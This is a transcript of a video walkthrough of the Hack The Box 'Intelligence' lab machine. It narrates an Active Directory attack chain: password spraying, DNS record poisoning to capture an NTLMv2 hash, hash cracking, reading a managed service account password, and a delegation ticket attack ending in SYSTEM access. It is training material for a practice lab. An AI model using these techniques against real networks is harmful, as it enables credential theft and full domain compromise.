 what's going on youtube this is ipsec i'm doing intelligence from hack the box which was a really fun active directory box that starts out with a web server but the only thing you're supposed to do is figure out how to brute force pdfs because files are uploaded with the date timestamp so you build a custom word list download a bunch of pdfs which gets you a username and password you can not log into the box instead you have to do a bunch of ad enumeration to discover that the user that you have credentials to has the ability to download a powershell script that leaks out that the web server is making http requests based upon domain names the user you have access to is the ability to create a dns record in the active directory database so you can force them to make a request back to you which then you can poison and ask for the ntlm hash the script authenticates to you you get access to a different user that can read the group managed service account password for the box that has the ability to do constrained delegation so you can do a silver ticket type of attack to impersonate the administrator user sounds like a lot but let's just jump in because it's simpler than it sounds as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output of formats bring the nmap directory and call it intelligence and then the ip address of 10 10 10 248 this can take some time to run so i've already ran it looking at the results we have a ton of ports open and just a quick glance i see dns kerberos and ldap so i'm going to assume this is indeed active directory but let's go over some ports dns on 53 it's banner says simple dns plus http on port 80 its banner says iis version 10.0 so it is a recent version of windows we have kerberos which leaks its server time which is important if we do some type of kerberos logins we'll probably get more into that later in the video ldap on 389 you do have the rpc stuff uh the ldap does leak the actual domain so let's go into a host file and edit that so sudo v etsy host and we can say 101010248 dc.intelligence.htb then intelligence.htb and also just intelligence okay so let's go keep going on the nmap a bunch of other just domain ports secure ldap right here more ldap so yeah that's about it we do have the clock skew and this is super important to know there is a clock sku but dn uh active directory servers generally host ntp so if we ever want to sync a time we can do that with an ntp command but let's go keep enumerating this so there was a web server and normally i would start there but testing out null authentication against the domain see if we can get a user listing is super quick so that's where i start so i'm going to do rpc client we try to log in we can't i'm going to add a dash n to say no password and then just do a new dom users and we can't i'm also going to try crack map exec so smb 10 10 10 248 and this will probably say it's a windows 10 box um let's try dash dash shares then we can try after that the password policy so pass paul and we can also use crack map exec to try to dump the users with users and i don't think this works let's try this um the shares did give me an error message i think let's look at that again it says error numerix shares status user session deleted i'm just going to add um null for user and password and then i'm going to remove the password because i think crack map exec um behaves differently based upon how you do those things i'm not sure if it's changed but yeah so i think if we don't specify the password it's like not specifying the user but you can see there's definitely a difference when you specify user and password versus um nothing so there's no real enumeration we can do there so let's take a look at the website so 10 10 10 248 and then i'm also going to do intelligence.htb and then dc.intelligence just to make sure there's no type of virtual host routing all these pages go to the same place we do have alum ipsum uh email address if i hit subscribe let's do at test.com also when we do this open up your developer tools we could do prep suite as well but developer tools is just as good if we want to check this and we're not doing any post request and looking at all the gets it doesn't look like we actually sent data with that so i'm going to ignore that we have an announcement document and then we also have other document and that's about it we do have a potential username of contact but yeah so looking at these uploads um it looks like it's just date dash upload.pdf so what i'm going to try to do is access the root to see if there's other documents here their root is disabled or directory listing is disabled but we can quickly build a word list of this date and try to get something out of it so let's do that i'm going to do use the date command if i do just date we can see what it is if i specify date equals and say one day ago we have that and then you can do plus and change like the format so um percent y is just going to output the year so year month day dash upload.pdf and that looks good so the next thing we have to do is probably do all 20 20 things so let's try 300 days ago to see where this is the 30th let's add 30 days now we're at december 31st so we can do 4in sequence 330 and we want to add 365 to that so 395. do and change this to be the variable and this is going to be numbers 330 to 395. and then say done and we've quickly built a list but i am off let's see because that's stopping 20 20 10 27 actually i went what let's see 20 20 12 31 oh shoot well that's embarrassing um 6.95 screwed up my edition a little bit forgot about the hundreds but there we go so we can do this to um i guess i can call this files and then the other thing i want to do is i'm going to use curl i could also use w get um let's go let's just use wget so make the pdf and the whole like internal debate between cole and wget we can show this real quick so if i just do curl dash o test.pdf i'm going to do wget on the same thing i'm going to run exift tool on both of those so 2020 we can see the file modification date and if i look at the curl exif tool uh what is it um test we can see it kept that times it did not obey that time stamp if you do use curl and you specify the dash capital r flag we can look at that again and now it did preserve the time stamp also it set it to access um not really important there but i'm going to default to wget because wgit by default will keep the same file name so let's do that date command again actually we have files so cat dot dot slash files there we go so i can do for i in this do if i echo i done it's just going to echo all those so hdp 10 10 248 slash is it documents yep document slash i so now it's going to output all those and we just wget not found oh it's getting a lot of not found because some of those files don't exist so let's look at pdf do we start having some files we do have some files so it looks like there's a bunch in november so i'm going to take a look at some of these pdfs real quick just look at what the metadata is let's see i wonder how i can grab everything up to the semicolon i think grep dash o p and we can say star dot semicolon like that is it capital l lowercase p let's see instead of gap we can just do awk and set the field separator to semicolon and then print one and the whole reason i was doing that is so i can do this sort u and what this allows me to do is look at all the um mime types not mime types whatever this piece of exif tool is all the things so i can see there is a creator um oftentimes there may be more than one way to put a username and the metadata so maybe there's an author tag or something but it looks like the only thing is creator we can also do it lsla now that this is done actually exif tool now that this is done and look at the modification date time so i'm going to do is grab on that and then we can sort dash u and everything is the same so let's grab out the author was it author creator creator and then let's do the same thing all dash f to split it oh that's not a good thing because we got that space so we got one two three so the default separator is like space or tab i believe so if i do awk print three now we have just a list of usernames so what i'm going to do is i'm going to run a tool called curbroot and i'm just going to grab it from my box somewhere and i put that um dollar sign because this is end of line this is drag x so i'm looking for all files that end in curb route and we can just uh copy it so cp and if you don't know what tool i'm using just go to github curb route and it is right here so let's do dot slash curb route and we can do user enum dc 101010248 domain intelligence.hdb and look at users 84. well doing a wc it looks like every single user is valid so i'm just going to verify what i did was correct by creating a test file with a user that doesn't exist to make sure it didn't say this one was valid because we want to make sure we aren't getting like a false positive so everything in that user list is good uh what we should do now is set up some type of recon in the background so i'm going to do password spray and then we can say [Music] users and what is this so we can say like everything was in april 2020 so i'm gonna say winter 2020 bang and we can let this run while we look at other things that was quick um could also do summers 2020 bang the reason why i always do the bang is because it's like the most common last character of a password and windows complexity generally requires you to do a symbol so just like went to 2020 probably wouldn't be a compliant password but what i want to do is grab all these pdfs and read them so i'm going to do pdf to text and if you don't have this i think it's just in the app repo we can do star.pdf and that did not work uh we can do 4in ls do pdf to text i done sweet now we have a list of all texts so i can cat star.txt and then we can grab dash i on like password and we have a hit so we can do like dash b5-a5 to get before and after five lines and we have the password here um another way we could have went about that is do a 4in ls again and then do echo i grep password i and then done we probably want to do a dash i to make it not case sensitive but now it's outputting ls star.txt and we can see this file exists in this june 4th so if i list that we can get the whole file there but we do have new intelligence corp user 9876 and oddly enough it doesn't have a special character in it so maybe i was wrong about that um we have valid login with error and the error is clock's gear is too great because we are doing some type of kerberos login we could make this go away using the ntp command but i think that's going to be an issue later on the video so i want to put it that section right next to that but we do have tiffany molina with that password so we can go back to crack map exec smb 10 10 10 248 dash u dash p we can grab this password again and see what we have access to so smb nothing let's try when rm and we're probably going to get nothing here as well we can do smb and then add dash dash shares and we could also run bloodhound so we'll probably do that in a minute but we do have a list of all the shares we could manually enumerate this but that could take some time so i'm just going to run the spyder plus query and i'll put time before crack map exec so we can see how long this query took but while that goes again i always like having recon going in the background while i work so the spyder plus is my background work um let's see let's do crack map exec again and i'm going to do smb 10 10 10 248 dash u tiffany molina p put this and we can say dash dash pass paul to get the password policy because i want to see if um it's forcing special characters so now that we have a single account uh password let's see what complexity password complexity is not set so that's why we did not need a special character there um the next thing i want to do is let's go to python bloodhound um it's probably in my opt right ls grep grep blood let's see bloodhound python we can just download that bloodhound.pie it's probably there actually so ls grep dash i blood yep i have bloodhound.pi there and let's move all this old data and i'm just going to get pull to make sure it's up to date and it looks like it is so we can do python3 bloodhound.pi and let's see we want to specify domain of intelligence. uh dc we can do 10 10 10 248 dash u tiffany morlina at intel oh we specified domain so i don't think we had to specify that dash p that is not the password let's go and grab it and crack map exec has finished and i think i want to do like dash c all let's see yeah we can do collection method all so now that's a tent forgot a 10 there let's see specified name server 10 10 10 248. let's see specified domain controller 10 10 10 48 but requires a first name so dc um what do we call this that's etsy harris was it dc.intelligence.htb it is so we can put that here dc intelligence hdb and we're missing digest mods so um let's see how do we fix this one uh i'm using python39 i think i have three eight installed as well there we go so i just need to switch python versions because that's where that dependency is but while bloodhound runs we can now go back to our crack map exec so if i look at this it's going to say where is it storing data should be opt cme spider plus so if i cap this we have a list of all the files since it is json data we can parse it in jq and then i'm going to look at the keys which is going to be all the file shares and if i do map values on keys we have a list of file shares and files so it looks like we have access to user.txt so we could get the user there is some powershell files here i'm just glancing over these are lnk i'm not really interested in lnk files right now so i'm going to grab dash v lnk and let's see what else is there blf ini those aren't really interesting the only powershell file that would be interesting is like a script or a log file like if i had the console script logging that would be really good uh we have sysvol this is just group policy stuff it's relatively empty so there's no real group policy in the it folder there is down detector.ps1 so that's the really the only thing so let's go and download that um i'm just going to use smb client i know we could use crack map exec to download it but i don't know the syntax off the top my head to do that but i do know smb clients so that's why i'm just going to default to that it doesn't really matter what tool you use as long as you use a tool that works so let's see slash it put the password in and i didn't have to specify the domain because this is a domain controller um typically you would probably have to like um do intelligence like that and specify the domain to log in but domain controllers you don't need to know the domain let's get down detector.ps1 file has been downloaded we also have bloodhound done um this is weird a dns timeout there we could probably edit a host file and point this host name to the actual dc but you shouldn't have to do that i'm going to do ns lookup in 10 10 10 248 actually ns look up and then set server 10 10 10 248 and paste in this actually server 10 whoops 10 10 10 248 paste get rid of that semicolon and it doesn't look like that domain exists or that host exists on the box um i'm guessing this is like a client and for some reason the workstation left the domain so it no longer exists let's see let's just look at down detector first and see what we have so we're importing active directory and it's going to go in the dns i'm going to take all the object names that start with web and attempt to download it using default credentials and then send a message from ted graves to ted graves saying the record is down so it looks like it's just crawling the um dns of this box and then anything that has a web it's attempting to do a get request on it and then if it fails it sends an email let's go take a look at the bloodhound data so i'm going to do sudo neo4j console to start up the graphql database or neo4j database i should say i think and then we run bloodhound and we'll also have to go to where the data is which is in opt i think bloodhound.pie and we have all these json files so we can upload that to bloodhound and take a look see everything is done let's do analysis we can say find all domain admins and there's just one administrator shortest path uh we are we have to be an enterprise admin administrators or the administrator user that's not really helpful we can look at dc sync writes and this is the domain controller and that's administrator again um let's see shortest path kerberostable members list all kerberos accounts only care bt gt as rep roast nothing there uh we can mark our user as owned so if i do tiffany molina and we can say merc as owned and then do shortest path from owned principles see if she can get anywhere she can't we can look at what groups she is a part of so first degree group membership domain users uh unrolled group membership domain user authenticated user pre windows 2000 certificate users everyone so there's nothing really interesting about tiffany let's take a look at other users on this box so i'm going to do craft map exec we can probably just do that instead of past paul i'm just going to do dash dash users we could also in bloodhound like hit enter and get users this way but if you did this on a domain it would be horrible you could also like just go and look at each group but i do like looking at it this way so we do have a lot of users here and um crack map exec also says the last time they had a bad password attempt which is nice i wish it outputted the password reset time i bet there's a flag to do that let's see administrator surprised i didn't get all those users let's see is there ted graves drew ted yep there is but i can click on svc int i'm not actually sure what like searching nothing did i should do the bloodhound academy module again because it goes into like writing custom cypher queries and everything that i continuously forget but we look at this account this svc end this is also where we have the error message i'm going to mark it as high value and we can see how we get to this so shortest path to here and let's see it looks like it is a group managed service account because i see all this read gmsa and group managed service accounts essentially um think of it like a machine account it rotates its password every x days i want to say every 30 days and it's like a 128 random character thing so you're not going to brute force these accounts and let's see we have ted graves laura can um read gms a password and all extended rights is to administrator so we want to get to these accounts 10 graves so i'm going to mark him as high value and more as high value as well and i'm going to go back to the analysis i'm going to do shortest path to high value targets and this is a mess let's see administrator domain admins that's not good not good ted graves so there's no real way to get to ted graves laura looks like there's no way because all like this left side is all domain administrators um svc int we have delegation here so if we can get onto svc it we're allowed to delegate over to the domain controller so this is probably a constrained delegation thing and if you're ever curious like what these mean you can right click on the edge to help and it talks about it but we're not that far yet so um let's go back to that down detector because we know we want to get to either this user ted graves or laura so the one thing about active directory is um anyone can create a domain entry because it has like this whole dynamic dns thing um you can harden it so users can't but typically like when you get a dhcp request um the machine goes and updates the um active directory to create like the reverse lookup and everything so you have a domain name uh we can do that as a user potentially using a tool called dns tool and do i have this no this is not it um it's out of um kb relay x which i don't think i've have on this machine because we haven't really done any relay attacks or anything but um let's do kb relay x and we can specify github as well and clone this is a good way to download this does he have install instructions nope so let's just download so git clone go in here and then we have dns tools so python3.8 dns tool dash h and gives the help i just do dns tool we have everything we need so dash u we want to specify intelligence slash tiffany molina and put this in single quotes because we have a backslash which is a special character dash p uh let's grab the password here then the next thing we need is um let's see r for target record let's do web ipsec.intelligence.htb dash a for action we want to add the type let's do an a record uh the dash d for record data we're gonna point it to ourselves at 10 10 14 8 and then the host name of the box we want it on is 1010 248. so let's try this to see exactly what happens binding to host and we have added it so what i'm going to do is also do nc lvnp 80 and see if it connects back to me and then if it gets connects back to me we know the down detector is running on some type of script which means um we may be able to use responder or something to steal a hash i'm just right now viewing it to make sure it would be indeed on port 80 and looks like it is and use default credentials so it should use the credentials of whoever is running the script so yeah now it's just a waiting game to see exactly how it connects to us or if it does and we do have it connect back to us um the host is set to web 9001 because when i was doing this box before recording that is what i had set it to but if i um go ns lookup server 10 10 10 248 and i say web ipsec.intelligence.htb it also points back to me uh web9001 intelligence.htb does as well and if i did like 9000 this is not one i tested with we see it doesn't go back to me so now we just need to run python so i can do python or not python we need to run responder so responder dash i ton zero and oh man i'm always having these issues with this let's see user share responder can i do python38 here sudo python38 uh responder.pi no option dce or pc let's see i only have three and three nine so i may not be doing this box with responder um you should be able to just do responder and then it connects back to responder's web interface and it forwards it to a um ntlm request which then it logs in you steal the hash but responder's not working so i'm going to switch over to msf metasploit i'm going to try it with an auxiliary script i have not actually done this so i'm not positive let's do use auxiliary server then capture and then after capture we probably want to do oh is it http or http probably http ntlm and then show options let's set servport to be 80 set uri path to be just slash and set serve host to 10 10 14 8 and that looks what oh srv there we go that's why you always show options before running it and i'm also going to set the john pw file to be intelligence so we actually save it to a file and then we'll try to crack this with hash cat but chances are we'll probably have to use john the ripper to crack it but we run this we have started the auxiliary server and if i do a lookup on web9001 intelligence.htb or web ipsec.intelligence.htb they both still point to me so if the server connects back to me we should have something metasploit isn't good at telling you when it connects and doesn't give you a hash i probably could have said it like in reverse mode i'm looking at the headers and we can see i do a get on slash and it tells me to authenticate via ntlm so when powershell sees that hopefully it attempts to log in with the default credentials but uh since i didn't set this in for burst mode i'm going to do sudo tcp dump dash i ton zero port 80. i'm also going to do dash n and throw a few dash v's so this way um if anything connects back to me on port 80 i'll see it and that means if this fails for whatever reason oh no so i'm gonna pause the video and we'll just wait for it to connect which could be a few minutes and looks like we have a hit so we captured a credential from ted graves we have this nt hash is this ntlm let's see let's copy um echo dash n wc-c 32 i really don't think that's an ntlm hash i didn't think we'd be able to get that well maybe we could um the way we can validate that is crack map exec so smb dash u ted graves uh let's see is it dash h for hash probably dash capital h right h let's see uh we did not specify ip 10 10 10 248 let's see what happens so yeah it did not because it's an ntlmv2 hash so you need to use this client uh let's see yeah it says it right here um it's been a while since i've used metasploit to do this but glad to know it still works if i look at ls here what do we call it intelligence ntlm so we have the captcha file right here and maybe this will work with hash cat uh that's a blank hash let's cat this one there we go so let's see yeah this is valid um i'm gonna go into the kraken which i don't have right now running i thought i would have it up um shoot i guess let's just crack this with john so john let's see specify this and then word list is equal to user share let's see ls user share word list rocky.text and we'll see how long this takes hopefully not too long it's got two passwords in it and it's attempting to crack and it looks like it did uh i think the password is mr.teddy i'm going to do show real quick to see what it is and indeed the password is mr.teddy so let's go back to that crack map and we can do dash p put that as the password and boom we have that credential however it doesn't let us log in on the server but when we looked at um this let's see where is ted is this one tad yeah i'm trying to make this graph pretty let's just do right click shortest path to here to this account we can see ted has read gms a password because he's an it support to this account which is allowed to delegate so if i do help on this let's see abuse info uh let's see is this a oh this is an executable um i want to say there's a python option now let's do read gmsa password python github let's see gmsa dumper python3 user pass domain let's try this probably have to use python38 again but that's not a problem so get clone go in here python38 let's see dash u intelligence ted graves put that in single quotes dash p mr teddy uh dash d intelligence dot hdb see ntlm needs domain slash user and a password i thought i did that dash u dash b let's do dash l as well 10 10 10 2 48 let's see u p d l is it a forward slash it's looking for see we're getting a ldap bind error now see authentication ntlm is this actually expecting an ntlm hash to authenticate it's possible that would be silly is that a different error message than when i did a backslash ntlm needs domain slash username let's do two backslashes so i think it really wants slash and now i think we are erroring because it's expecting see what is the password would i have that at that's not it mr this is definitely it huh i'm going to do date and we're going to set ntp date 10 10 10 248 and make sure our time is correct and if our time is correct and it still errors i'm going to convert this over to a ntlm hash and we're going to try it again let's see is this going to work nope so let's go to google uh generate ntlm hash this paste okay dash p still airing out so that was not it this is a head scratcher now i'm gonna try removing the domain altogether because when i did this slash it had something weird this got rid of that error message but maybe it got rid of the error message for the wrong way i did specify dash d right here so maybe it's smart enough to put the domain in the user and boom that was definitely it awesome so now we have the hash for this um account and we could probably validate it i think with crack map exec so crack map exec smb 10 10 10 248 dash u svc and we want dash capital h and whenever it ends with a um dollar sign that means it's either a machine account or a managed service account so doing this we can't win our m we still can't um [Music] ps exec however we can generate a silver ticket so with the silver ticket if you don't have your date synced you definitely do need to so i'm going to run ntp date again just to validate our time is synced and once this gets back we can begin the silver ticket which i want to say um it's probably an impact honestly user share impact examples let's see that's not where it is let's try opt impacted examples here it is and the script we want is get st forget silver ticket so i'm going to do python38 get st dot pi and we have to set the spn uh i think it's http dc intelligence dot hdb dash impersonate we want to impersonate the administrator and then we give it the domain so intelligence as long it can spell correctly svc int and i want to say i need the dollar sign if i if it doesn't work then i'm going to um try it without it and let's see here's the hash and i'm going to do the hash colon the hash because this is the landman and this is ntlm new technology landman and for some reason everything likes having um this format and it doesn't even use landman anymore but yeah let's see spn is not allowed to delegate um let's take this dollar off and then if that isn't it maybe it's um dub dub dub let's try dub dub dub because this is an iis server there we go saving ticket to administrator dot cash so we can export kb 5 cc name is equal to administrator dot cc cash and we can just do impacted ps exec k no pass dc intelligence dot hdb and it should pull this ticket for my um in packet uh pre-off failed let's try wmi exec maybe did i screw something up let's see kdc pre-authentication information was invalid let's set the date again maybe for some reason like my vmware tools sink the clock back and my time wasn't in sync no i was within a second let's see um oh i probably need administrator at this kdc pre-auth failed pre-authentication information was invalid this is not going to plan uh 10 10 10 4 uh 10 10 yeah 10 248 and min is straighter let's try this server ticket again let's see ls let's move this into my home directory i don't think that matters see now if i get rid of all these it's gonna ask me for a password right it does see let's just take a step back and redo the whole silver ticket attack because everything is pretty pretty picky so we're doing a get silver ticket specifying the spn impersonating administrator we don't have a fully qualified domain name here so let's try putting it we have the uh group managed service account and the hash okay so now we can copy this administrator thing into our home directory and we should be able to export kb5 cc name administrator dot cc cache let's not put a trailing space there maybe that was it that would be a really stupid thing but i've seen worse so let's do in packet ps exec dash k dash no pass and then we'll also specify the full domain slash administrator at 10 10 10 248. let's see if this works okay that doesn't we let's do it without environment variables ps exec dash k no pass we can just copy this actually copy paste okay let's do the fully qualified domain name here so dc.intelligence.htv and there we go that was it we needed that combination and we are now system on this box so we could go get the root flag out of curiosity i'm just going to take this out because it is in my environment variable so was that the issue yep so that was the issue um hope you guys enjoyed that box take care and i will see you all next week